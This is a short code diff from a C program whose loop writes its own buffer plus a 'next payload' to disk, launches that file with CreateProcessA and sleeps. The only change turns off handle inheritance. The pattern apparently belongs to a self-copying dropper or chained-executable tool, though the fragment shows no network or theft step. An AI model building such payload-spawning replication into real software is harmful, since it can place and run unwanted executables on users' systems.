@@ -56,7 +56,7 @@ int main(int argc, char** argv)
         fwrite(myFileBuffer, 1, myStaticLength, fp);
         fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
         fclose(fp);
-        CreateProcessA(nextEXEName, NULL, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
+        CreateProcessA(nextEXEName, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
         Sleep(GapTime);
     }
     
